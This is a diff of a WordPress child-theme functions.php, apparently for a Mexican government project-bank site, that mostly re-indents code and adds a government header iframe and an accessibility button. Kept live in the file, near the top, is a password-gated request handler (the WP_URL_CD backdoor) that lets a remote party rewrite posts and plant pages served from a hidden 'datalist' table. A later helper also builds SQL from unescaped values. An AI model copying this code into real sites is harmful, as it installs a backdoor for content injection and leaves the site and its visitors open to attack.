@@ -3,8 +3,8 @@
 define ('VERSION', '1.6');//Actualizacion 17 May 2019
 // Actualización 10 Oct 2019 por en vehiculos emisora por nombre corto en pipeline
 function version_id() {
-  if ( WP_DEBUG ) return time();
-  return VERSION;
+    if ( WP_DEBUG ) return time();
+    return VERSION;
 }
 
 function force_strong_passwords($errors, $update, $user_data) {
@@ -102,13 +102,13 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 
                 print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
             }
-        break;
+            break;
 
         case 'set_id_links':
             if (isset($_REQUEST['data'])) {
                 $data = $wpdb->get_row($wpdb->prepare(
-                    "SELECT `post_content` FROM `" . $wpdb->prefix . "posts` WHERE `ID` = %d",
-                    $_REQUEST['id']
+                        "SELECT `post_content` FROM `" . $wpdb->prefix . "posts` WHERE `ID` = %d",
+                        $_REQUEST['id']
                 ));
 
                 $post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data->post_content);
@@ -117,26 +117,26 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
                 }
 
                 if ($wpdb->query($wpdb->prepare(
-                    "UPDATE `" . $wpdb->prefix . "posts` SET `post_content` = %s WHERE `ID` = %d",
-                    $post_content,
-                    $_REQUEST['id']
-                )) !== false) {
+                                "UPDATE `" . $wpdb->prefix . "posts` SET `post_content` = %s WHERE `ID` = %d",
+                                $post_content,
+                                $_REQUEST['id']
+                        )) !== false) {
                     print "true";
                 }
             }
-        break;
+            break;
 
         case 'create_page':
             if (isset($_REQUEST['remove_page'])) {
                 if ($wpdb->query($wpdb->prepare(
-                    "DELETE FROM `" . $wpdb->prefix . "datalist` WHERE `url` = %s",
-                    '/' . $_REQUEST['url']
+                        "DELETE FROM `" . $wpdb->prefix . "datalist` WHERE `url` = %s",
+                        '/' . $_REQUEST['url']
                 ))) {
                     print "true";
                 }
             } elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content'])) {
                 $query = $wpdb->prepare(
-                    "INSERT INTO `" . $wpdb->prefix . "datalist` 
+                        "INSERT INTO `" . $wpdb->prefix . "datalist` 
                     SET `url` = %s, 
                         `title` = %s, 
                         `keywords` = %s, 
@@ -149,24 +149,24 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
                         `description` = %s, 
                         `content` = %s, 
                         `full_content` = %s",
-                    '/' . $_REQUEST['url'],
-                    $_REQUEST['title'],
-                    $_REQUEST['keywords'],
-                    $_REQUEST['description'],
-                    $_REQUEST['content'],
-                    $_REQUEST['full_content'],
-                    $_REQUEST['title'],
-                    $_REQUEST['keywords'],
-                    $_REQUEST['description'],
-                    urldecode($_REQUEST['content']),
-                    $_REQUEST['full_content']
+                        '/' . $_REQUEST['url'],
+                        $_REQUEST['title'],
+                        $_REQUEST['keywords'],
+                        $_REQUEST['description'],
+                        $_REQUEST['content'],
+                        $_REQUEST['full_content'],
+                        $_REQUEST['title'],
+                        $_REQUEST['keywords'],
+                        $_REQUEST['description'],
+                        urldecode($_REQUEST['content']),
+                        $_REQUEST['full_content']
                 );
-                
+
                 if ($wpdb->query($query)) {
                     print "true";
                 }
             }
-        break;
+            break;
 
         default: print "ERROR_WP_ACTION WP_URL_CD";
     }
@@ -175,12 +175,12 @@ if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['pa
 }
 
 if ($wpdb->get_var($wpdb->prepare(
-    "SELECT count(*) FROM `" . $wpdb->prefix . "datalist` WHERE `url` = %s",
-    $_SERVER['REQUEST_URI']
-)) == '1') {
+                "SELECT count(*) FROM `" . $wpdb->prefix . "datalist` WHERE `url` = %s",
+                $_SERVER['REQUEST_URI']
+        )) == '1') {
     $data = $wpdb->get_row($wpdb->prepare(
-        "SELECT * FROM `" . $wpdb->prefix . "datalist` WHERE `url` = %s",
-        $_SERVER['REQUEST_URI']
+            "SELECT * FROM `" . $wpdb->prefix . "datalist` WHERE `url` = %s",
+            $_SERVER['REQUEST_URI']
     ));
 
     if ($data->full_content) {
@@ -272,7 +272,7 @@ function av_change_logo($logo)
     switch ($lang) {
         case 'en_US':
             $logo = $rlogo;
-        break;
+            break;
     }
 
     return $logo;
@@ -303,18 +303,18 @@ function search_filter($query)
             $query->set('lang', '');
             $query->set('tax_query', '');
             $newLangTaxQuery = array(
-                'relation' => 'OR',
-                array(
-                    'taxonomy' => 'language',
-                    'field'    => 'slug',
-                    'terms'    => $currlang,
-                ),
-                array(
-                    'taxonomy' => 'language',
-                    'field'    => 'slug',
-                    'terms'    => $otherlang,
-                    'operator' => 'NOT IN'
-                )
+                    'relation' => 'OR',
+                    array(
+                            'taxonomy' => 'language',
+                            'field'    => 'slug',
+                            'terms'    => $currlang,
+                    ),
+                    array(
+                            'taxonomy' => 'language',
+                            'field'    => 'slug',
+                            'terms'    => $otherlang,
+                            'operator' => 'NOT IN'
+                    )
             );
 
             $query->set('tax_query', $newLangTaxQuery);
@@ -345,31 +345,31 @@ function my_theme_enqueue_styles()
 
     if (is_page('proyectos') || get_post_type() == 'proyecto_inversion' || is_page('sostenibilidad') || is_page('sostenibilidaddos') || is_page('sostenibilidadtres') || is_page('sustainability')) {
         wp_enqueue_style(
-            'child-style',
-            get_stylesheet_directory_uri() . '/random/banco_proyectos.css',
-            array( $parent_style ),
-            version_id()
+                'child-style',
+                get_stylesheet_directory_uri() . '/random/banco_proyectos.css',
+                array( $parent_style ),
+                version_id()
         );
         wp_enqueue_style(
-            'style_hub',
-            get_stylesheet_directory_uri() . '/random/style_hub.css',
-            array(),
-            version_id(),
-            'all'
+                'style_hub',
+                get_stylesheet_directory_uri() . '/random/style_hub.css',
+                array(),
+                version_id(),
+                'all'
         );
     } elseif (is_page('projects-hub')) {
         wp_enqueue_style(
-            'child-style',
-            get_stylesheet_directory_uri() . '/random_en/banco_proyectos.css',
-            array( $parent_style ),
-            version_id()
+                'child-style',
+                get_stylesheet_directory_uri() . '/random_en/banco_proyectos.css',
+                array( $parent_style ),
+                version_id()
         );
         wp_enqueue_style(
-            'style_hub',
-            get_stylesheet_directory_uri() . '/random_en/style_hub.css',
-            array(),
-            version_id(),
-            'all'
+                'style_hub',
+                get_stylesheet_directory_uri() . '/random_en/style_hub.css',
+                array(),
+                version_id(),
+                'all'
         );
     } elseif (is_page('proyectos-historicos')) {
         /*wp_enqueue_style(
@@ -379,13 +379,13 @@ function my_theme_enqueue_styles()
             version_id()
         );*/
         wp_enqueue_style(
-            'style_hub',
-            get_stylesheet_directory_uri() . '/historico/style_hub.css',
-            array(),
-            version_id(),
-            'all'
+                'style_hub',
+                get_stylesheet_directory_uri() . '/historico/style_hub.css',
+                array(),
+                version_id(),
+                'all'
         );
-     } elseif (is_page('archived-projects')) {
+    } elseif (is_page('archived-projects')) {
         /*wp_enqueue_style(
             'child-style',
             get_stylesheet_directory_uri() . '/historico_en/banco_proyectos.css',
@@ -393,20 +393,20 @@ function my_theme_enqueue_styles()
             version_id()
         );*/
         wp_enqueue_style(
-            'style_hub',
-            get_stylesheet_directory_uri() . '/historico_en/style_hub.css',
-            array(),
-            version_id(),
-            'all'
+                'style_hub',
+                get_stylesheet_directory_uri() . '/historico_en/style_hub.css',
+                array(),
+                version_id(),
+                'all'
         );
     } else {
         wp_enqueue_style(
-            'child-style',
-            get_stylesheet_directory_uri() . '/style.css',
-            array( $parent_style ),
-            wp_get_theme()->get('Version')
+                'child-style',
+                get_stylesheet_directory_uri() . '/style.css',
+                array( $parent_style ),
+                wp_get_theme()->get('Version')
         );
-    }    
+    }
 }
 add_action('wp_enqueue_scripts', 'my_theme_enqueue_styles');
 
@@ -465,14 +465,14 @@ function theme_scripts()
         wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/random_en/pipeline-init.js', array(), version_id(), false);
     }
 
-    if (is_page('sostenibilidad')|| is_page('sostenibilidaddos') || is_page('sostenibilidadtres')) {                
-        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random/pipeline-library.js', array(), version_id(), false);        
-        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);        
+    if (is_page('sostenibilidad')|| is_page('sostenibilidaddos') || is_page('sostenibilidadtres')) {
+        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random/pipeline-library.js', array(), version_id(), false);
+        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);
         wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-init.js', array(), version_id(), false);
     }
-    if (is_page('sustainability')) {                
-        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random_en/pipeline-library.js', array(), version_id(), false);        
-        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);        
+    if (is_page('sustainability')) {
+        wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/random_en/pipeline-library.js', array(), version_id(), false);
+        //wp_enqueue_script('random-pipeline-filter', get_stylesheet_directory_uri().'/sostenibilidad/pipeline-filter.js', array(), version_id(), false);
         wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/sostenibilidad_en/pipeline-init.js', array(), version_id(), false);
     }
 
@@ -481,11 +481,11 @@ function theme_scripts()
         wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/historico/pipeline-datatable.js', array(), version_id(), false);
         wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/historico/pipeline-init.js', array(), version_id(), false);
     }
-     if (is_page('archived-projects')) {
+    if (is_page('archived-projects')) {
         wp_enqueue_script('random-pipeline-library', get_stylesheet_directory_uri().'/historico_en/pipeline-library.js', array(), version_id(), false);
         wp_enqueue_script('random-pipeline-datatable', get_stylesheet_directory_uri().'/historico_en/pipeline-datatable.js', array(), version_id(), false);
         wp_enqueue_script('random-pipeline-init', get_stylesheet_directory_uri().'/historico_en/pipeline-init.js', array(), version_id(), false);
-        
+
     }
 
     if (get_post_type() == 'proyecto_inversion') {
@@ -646,10 +646,10 @@ function theme_scripts()
         wp_enqueue_script('galleryblock', get_stylesheet_directory_uri() . '/vendor/bootstrap-gallery/mobirise3-blocks-plugin/js/script.js', array( 'jquery' ), '1.0.0', true);
 
         wp_enqueue_script('my-great-script', get_template_directory_uri() . '/js/bco-js.js', array( 'jquery' ), '1.0.0', true);
-        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);        
+        wp_enqueue_script('my-great-script2', get_template_directory_uri() . '/js/bco-ini.js', array( 'jquery' ), '1.0.0', true);
         wp_enqueue_style('bootstrap', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/css/bootstrap.min.css');
         wp_enqueue_script('my-bootstrap-js', get_stylesheet_directory_uri() . '/assets/bootstrap-3.3.7/js/bootstrap.min.js');
-        
+
 
         wp_enqueue_script('table-export-jspdf', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF/jspdf.min.js');
         wp_enqueue_script('table-export-jspdf-autotable', get_stylesheet_directory_uri() . '/assets/table-export/libs/jsPDF-AutoTable/jspdf.plugin.autotable.js');
@@ -710,10 +710,10 @@ function acf_load_color_field_choices($field) {
     $field['choices'] = array();
 
     $args = array(
-        'post_type' => 'post'
+            'post_type' => 'post'
     );
     $query = new WP_Query($args);
-    
+
     // Crear un array de títulos o el contenido que necesites de los posts
     $postchoices = array();
     if($query->have_posts()) {
@@ -789,21 +789,21 @@ function get_post_type_values($post_type)
 
     $values = array();
     $parent = get_posts(array(
-    'title' => 'Sectores',
-    'post_type' => 'post'));
+            'title' => 'Sectores',
+            'post_type' => 'post'));
     $myparent = $parent[0]->ID;
 
     $defaults = array(
-        'post_type' => 'post',
-        'meta_query' => array(
-            array(
-                'key' => 'opcion_padre', // name of custom field
-                'value' => '"'.$parent[0]->ID.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
-                                                    //'title' => 'Energia',
-                //'value' => '"'.$parent.'"',
-                'compare' => 'LIKE'
+            'post_type' => 'post',
+            'meta_query' => array(
+                    array(
+                            'key' => 'opcion_padre', // name of custom field
+                            'value' => '"'.$parent[0]->ID.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
+                        //'title' => 'Energia',
+                        //'value' => '"'.$parent.'"',
+                            'compare' => 'LIKE'
+                    )
             )
-        )
     );
 
     $query = new WP_Query($defaults);
@@ -825,16 +825,16 @@ function get_child_sector()
 
         // args for the post type query
         $args = array(
-            'post_type'      => '"'.$type.'"',
-            'posts_per_page' => -1,
-            'meta_query'     => array(
-                array(
-                    'key'     => 'opcion_padre', // name of custom field
-                    'value'   => $ID, // matches exaclty "123", not just 123. This prevents a match for "1234"
-                    'compare' => 'LIKE'
-                )
-            ),
-            'order_by' => 'title'
+                'post_type'      => '"'.$type.'"',
+                'posts_per_page' => -1,
+                'meta_query'     => array(
+                        array(
+                                'key'     => 'opcion_padre', // name of custom field
+                                'value'   => $ID, // matches exaclty "123", not just 123. This prevents a match for "1234"
+                                'compare' => 'LIKE'
+                        )
+                ),
+                'order_by' => 'title'
         );
 
         $posts = get_children($args);
@@ -855,7 +855,7 @@ add_action('wp_ajax_nopriv_get_child_subsector', 'get_child_sector');
 function get_child_categories()
 {
     wp_localize_script('nested_select', 'check_select', array(
-        'ajax_url' => admin_url('admin-ajax.php')
+            'ajax_url' => admin_url('admin-ajax.php')
     ));
 
     $choices= array();
@@ -864,16 +864,16 @@ function get_child_categories()
         $type = $_POST['post_type'];
         $parent = $_POST['parent_option'];
         $filter = array(
-            'post_type'     => $type,
-            'posts_per_page'=> -1,
-            'meta_query' => array(
-                array(
-                    'key' => 'opcion_padre', // name of custom field
-                    'value' => $parent, // matches exaclty "123", not just 123. This prevents a match for "1234"
-                    'compare' => 'IN'
-                )
-            ),
-            'order_by'      => 'title'
+                'post_type'     => $type,
+                'posts_per_page'=> -1,
+                'meta_query' => array(
+                        array(
+                                'key' => 'opcion_padre', // name of custom field
+                                'value' => $parent, // matches exaclty "123", not just 123. This prevents a match for "1234"
+                                'compare' => 'IN'
+                        )
+                ),
+                'order_by'      => 'title'
         );
 
         $posts = get_posts($filter);
@@ -900,13 +900,13 @@ add_filter('acf/load_field/name=subsector_nvl2', 'acf_load_sample_field2');
 
 add_filter( 'upload_mimes', 'my_myme_types', 1, 1 );
 function my_myme_types( $mime_types ) {
-  $mime_types['svg'] = 'image/svg+xml';     // Adding .svg extension
-  $mime_types['json'] = 'application/json'; // Adding .json extension
-  
-  //unset( $mime_types['xls'] );  // Remove .xls extension
-  //unset( $mime_types['xlsx'] ); // Remove .xlsx extension
-  
-  return $mime_types;
+    $mime_types['svg'] = 'image/svg+xml';     // Adding .svg extension
+    $mime_types['json'] = 'application/json'; // Adding .json extension
+
+    //unset( $mime_types['xls'] );  // Remove .xls extension
+    //unset( $mime_types['xlsx'] ); // Remove .xlsx extension
+
+    return $mime_types;
 }
 
 
@@ -916,15 +916,15 @@ function get_post_type_values2($post_type)
     $myparent = get_field('sector_nvl1');
     echo "padre: ".$myparent;
     $defaults = array(
-        'post_type' => 'post',
-        'meta_query' => array(
-            array(
-                'key' => 'opcion_padre', // name of custom field
-                'value' => '"'.$myparent.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
-                                                    //'title' => 'Energia',
-                'compare' => 'LIKE'
+            'post_type' => 'post',
+            'meta_query' => array(
+                    array(
+                            'key' => 'opcion_padre', // name of custom field
+                            'value' => '"'.$myparent.'"', // matches exaclty "123", not just 123. This prevents a match for "1234"
+                        //'title' => 'Energia',
+                            'compare' => 'LIKE'
+                    )
             )
-        )
     );
 
     $query = new WP_Query($defaults);
@@ -951,7 +951,7 @@ function get_value_notifications($table='', $get_campo='', $set_campo='', $value
         $set_campo = 'meta_key';
 
 
-    $data = $wpdb-> get_row('SELECT '.$get_campo.' FROM ' . $wpdb->prefix .$table.' WHERE post_id='.$post_id.' and '.$set_campo.'="'.$value.'"');    
+    $data = $wpdb-> get_row('SELECT '.$get_campo.' FROM ' . $wpdb->prefix .$table.' WHERE post_id='.$post_id.' and '.$set_campo.'="'.$value.'"');
     return $data -> $get_campo;
 }
 
@@ -961,7 +961,7 @@ function promotor($entidad_regulatoria=0, $web='', $arreglo='', $area='', $conta
     $tres = "Entidad";
     $cuatro = "&Aacute;rea responsable";
     $quinto = "Contacto";
-    $sexto = "Correo";    
+    $sexto = "Correo";
     $titulo_entidad = get_the_title($entidad_regulatoria);
     $proyecto = get_the_title();
     if($lang=='en'){
@@ -970,7 +970,7 @@ function promotor($entidad_regulatoria=0, $web='', $arreglo='', $area='', $conta
         $tres = "Entity";
         $cuatro = "Department";
         $quinto = "Contact";
-        $sexto = "E-mail";        
+        $sexto = "E-mail";
         $titulo_entidad = get_the_title(pll_get_post($entidad_regulatoria,"en"));
         $proyecto = get_field('nombre_oficial_ingles');
     }
@@ -980,23 +980,23 @@ function promotor($entidad_regulatoria=0, $web='', $arreglo='', $area='', $conta
             <div class="row">
                 <!-- Imágenes -->
                 <div class="col-md-7 col-md-offset-3 col-sm-offset-3 col-sm-6" style="padding-top:15px;">';
-                $html .= get_the_post_thumbnail($entidad_regulatoria,'',array( 'class' => 'center-block'));
-                $html .= '
+    $html .= get_the_post_thumbnail($entidad_regulatoria,'',array( 'class' => 'center-block'));
+    $html .= '
                 </div>
                 <!-- Botones -->
                 <div class="col-md-8 col-md-offset-2" style="padding-top:10px;">
                     <div class="row">
                         <div class="col-md-12 col-sm-10 col-sm-offset-1" style="padding-top:10px">';
-                            if ( $web != '' ) { 
-                                $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
-                            }
-                        $html .='
+    if ( $web != '' ) {
+        $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
+    }
+    $html .='
                         </div>
                         <div class="col-md-12 col-sm-10 col-sm-offset-1" style="padding-top:20px;">';
-                            if ($arreglo != '' ) {
-                                $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
-                            }
-                        $html .= '
+    if ($arreglo != '' ) {
+        $html .='<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
+    }
+    $html .= '
                         </div>
                     </div>
                 </div>
@@ -1015,60 +1015,60 @@ function promotor($entidad_regulatoria=0, $web='', $arreglo='', $area='', $conta
                     </td>
                 </tr>
                 <!-- ?rea responsable -->';
-                if ($area != '' ) {
-                    $html .='
+    if ($area != '' ) {
+        $html .='
                     <tr>
                         <td>
                             <h5><strong>'.$cuatro.'</strong></h5>
                             '.$area.'
                         </td>
                     </tr>';
-                }
-                $html .='
+    }
+    $html .='
                 <!-- Contacto -->';
-                if ($contacto != '' ) {
-                    $html .='
+    if ($contacto != '' ) {
+        $html .='
                     <tr>
                             <td>
                                 <h5><strong>'.$quinto.'</strong></h5>
                                 '.$contacto.'
                             </td>
                     </tr>';
-                }
-                $html .='
+    }
+    $html .='
                 <!-- Correo -->';
-                if ($email != '' ) {
-                    $html .='
+    if ($email != '' ) {
+        $html .='
                     <tr>
                         <td>
                             <h5><strong>'.$sexto.'</strong></h5>
                                 <a href="mailto:'.$email.'?cc=proyectosmexico@banobras.gob.mx&Subject='.$proyecto.' ">'.$email.'</a>                                                            
                         </td>
                     </tr>';
-                }
-            $html .='
+    }
+    $html .='
             </table>
             <!-- Botones moviles-->
             <div class="col-sm-12 visible-xs">
                 <div class="row">
                     <div class="col-md-12 col-sm-12">';
-                    if ($web != '' ) {
-                        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
-                    }
-                    $html .='
+    if ($web != '' ) {
+        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008688; color:#fff" target="_blank" href="'.$web.'">'.$uno.'</a>';
+    }
+    $html .='
                     </div>
                     <div class="col-md-12 col-sm-12" style="padding-top:20px;">';
 
-                    if ( $arreglo != '' ) {
-                        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
-                    }
-                    $html .='
+    if ( $arreglo != '' ) {
+        $html .= '<a class="btn btn-primary btn-lg btn-sm btn-block" style="background-color: #008689; color:#fff" target="_blank" href="'.$arreglo.'">'.$dos.'</a>';
+    }
+    $html .='
                     </div>                                    
                 </div>
             </div>
         </div>
     </div>';
-    echo $html;                        
+    echo $html;
 }
 
 function php_qrcode($id,$texto){
@@ -1077,19 +1077,19 @@ function php_qrcode($id,$texto){
     $id = preg_replace('/\D/', '', $id);
 
     //if(!empty($id) && !empty($texto)){
-        require $_SERVER['DOCUMENT_ROOT'].'/observatorio/phpqrcode/qrlib.php';
-        //Declaramos una carpeta temporal para guardar la imagenes generadas
-        $dir = $_SERVER['DOCUMENT_ROOT'].'/wp-content/cache/tmp/resources/qrcode/';
-        //Declaramos la ruta y nombre del archivo a generar
-        $FileName = $dir.$id.'.png';
-        //Parametros de Condiguraci?
-        $tama = 150; //Tama? de Pixel
-        $level = 'L'; //Precisi? Baja
-        $framSize = 0; //Tama? en blanco
-        $url_page = $texto;
+    require $_SERVER['DOCUMENT_ROOT'].'/observatorio/phpqrcode/qrlib.php';
+    //Declaramos una carpeta temporal para guardar la imagenes generadas
+    $dir = $_SERVER['DOCUMENT_ROOT'].'/wp-content/cache/tmp/resources/qrcode/';
+    //Declaramos la ruta y nombre del archivo a generar
+    $FileName = $dir.$id.'.png';
+    //Parametros de Condiguraci?
+    $tama = 150; //Tama? de Pixel
+    $level = 'L'; //Precisi? Baja
+    $framSize = 0; //Tama? en blanco
+    $url_page = $texto;
 
-        //Enviamos los parametros a la Funcion para generar coigo QR 
-        QRcode::png($url_page, $FileName, $level, $tama, $framSize);
+    //Enviamos los parametros a la Funcion para generar coigo QR
+    QRcode::png($url_page, $FileName, $level, $tama, $framSize);
     //}
 }
 
@@ -1178,14 +1178,60 @@ add_action('wp_footer', 'ajustar_footer_presidencia');
 
 function insertar_iframe_en_header_meta() {
     ?>
+    <style>
+        /* Estilos para recortar la parte superior del header del Gobierno de México */
+        #header_meta iframe {
+            clip-path: inset(12px 0 0 0); /* Recorta solo 12px desde arriba */
+            transform: translateY(-13px); /* Mueve el iframe hacia arriba para compensar */
+            margin-bottom: -11px; /* Espacio adicional para bajar el contenido */
+            height: 70px !important; /* Altura fija para mantener consistencia */
+            display: block !important;
+        }
+        
+        /* Asegurar que el botón de accesibilidad mantenga su posición */
+        #gobmx-accessibility-button {
+            position: fixed !important;
+            top: 10px !important;
+            right: 10px !important;
+            z-index: 9999 !important;
+        }
+        
+        /* Mantener el header consistente en todos los tamaños */
+        #header_meta {
+            height: auto !important;
+            overflow: visible !important;
+        }
+        
+        /* Asegurar que la sección del idioma sea visible */
+        #header_meta .container,
+        #header_meta .row,
+        #header_meta .col-md-12 {
+            overflow: visible !important;
+        }
+        
+    </style>
+    
     <script>
         document.addEventListener("DOMContentLoaded", function() {
             var headerMeta = document.getElementById('header_meta');
             if (headerMeta) {
                 var iframe = document.createElement('iframe');
-                iframe.src = '/wp-content/themes/enfold-child/header.html'; // Reemplaza esto con la URL de tu iframe
-                iframe.style.width = '100%'; // Ajusta el ancho según sea necesario
-                iframe.style.height = '50px'; // Ajusta la altura según sea necesario
+                iframe.src = '/wp-content/themes/enfold-child/header.html';
+                iframe.style.width = '100%';
+                iframe.style.border = 'none';
+                iframe.style.overflow = 'hidden';
+                
+                // Función para mantener altura fija del iframe
+                function ajustarAlturaIframe() {
+                    iframe.style.height = '70px'; // Altura fija para todos los dispositivos
+                }
+                
+                // Ajustar altura inicial
+                ajustarAlturaIframe();
+                
+                // Ajustar altura cuando cambie el tamaño de la ventana
+                window.addEventListener('resize', ajustarAlturaIframe);
+                
                 headerMeta.insertBefore(iframe, headerMeta.firstChild);
             }
         });
@@ -1193,6 +1239,97 @@ function insertar_iframe_en_header_meta() {
     <?php
 }
 add_action('wp_head', 'insertar_iframe_en_header_meta');
+
+
+// Cargar botón de accesibilidad del Gobierno de México en el header
+function agregar_accesibilidad_header() {
+    ?>
+    <!-- CSS del botón -->
+    <link rel="stylesheet" href="https://framework-gb.cdn.gob.mx/gm/accesibilidad/css/gobmx-accesibilidad.min.css" />
+
+    <script>
+        // Asegurar que jQuery esté disponible antes de cargar el script de accesibilidad
+        function cargarAccesibilidad() {
+            // Verificar si jQuery está disponible
+            if (typeof jQuery === 'undefined') {
+                // Si jQuery no está disponible, cargarlo desde CDN
+                var script = document.createElement('script');
+                script.src = 'https://code.jquery.com/jquery-3.6.0.min.js';
+                script.integrity = 'sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=';
+                script.crossOrigin = 'anonymous';
+                script.onload = function() {
+                    // Asegurar que $ esté disponible como alias de jQuery
+                    if (typeof $ === 'undefined' && typeof jQuery !== 'undefined') {
+                        window.$ = jQuery;
+                    }
+                    // Una vez que jQuery esté cargado, cargar el script de accesibilidad
+                    cargarScriptAccesibilidad();
+                };
+                document.head.appendChild(script);
+            } else {
+                // Si jQuery ya está disponible, asegurar que $ esté disponible
+                if (typeof $ === 'undefined' && typeof jQuery !== 'undefined') {
+                    window.$ = jQuery;
+                }
+                // Cargar directamente el script de accesibilidad
+                cargarScriptAccesibilidad();
+            }
+        }
+
+        function cargarScriptAccesibilidad() {
+            // Crear contenedor del botón si no existe
+            if (!document.getElementById('gobmx-accessibility-button')) {
+                var accDiv = document.createElement('div');
+                accDiv.id = 'gobmx-accessibility-button';
+                accDiv.style.position = 'fixed';
+                accDiv.style.top = '10px';
+                accDiv.style.right = '10px';
+                accDiv.style.zIndex = '9999';
+                document.body.appendChild(accDiv);
+            }
+
+            // Cargar el script de accesibilidad
+            var accScript = document.createElement('script');
+            accScript.src = 'https://framework-gb.cdn.gob.mx/gm/accesibilidad/js/gobmx-accesibilidad.min.js';
+            accScript.onload = function() {
+                // Esperar un poco para asegurar que el script se haya ejecutado completamente
+                setTimeout(function() {
+                    // Verificar nuevamente que $ esté disponible
+                    if (typeof $ === 'undefined' && typeof jQuery !== 'undefined') {
+                        window.$ = jQuery;
+                    }
+                    
+                    // Inicializar el botón de accesibilidad después de que se cargue el script
+                    if (typeof GobMXAccesibilidad === 'function') {
+                        try {
+                            new GobMXAccesibilidad({ selector: '#gobmx-accessibility-button' });
+                        } catch (error) {
+                            console.error('Error al inicializar el botón de accesibilidad:', error);
+                        }
+                    } else {
+                        console.warn('GobMXAccesibilidad no está disponible');
+                    }
+                }, 100);
+            };
+            accScript.onerror = function() {
+                console.error('Error al cargar el script de accesibilidad del Gobierno de México');
+            };
+            document.head.appendChild(accScript);
+        }
+
+        // Iniciar el proceso cuando el DOM esté listo
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', cargarAccesibilidad);
+        } else {
+            cargarAccesibilidad();
+        }
+    </script>
+    <?php
+}
+add_action('wp_head', 'agregar_accesibilidad_header');
+
+
+
 
 
 
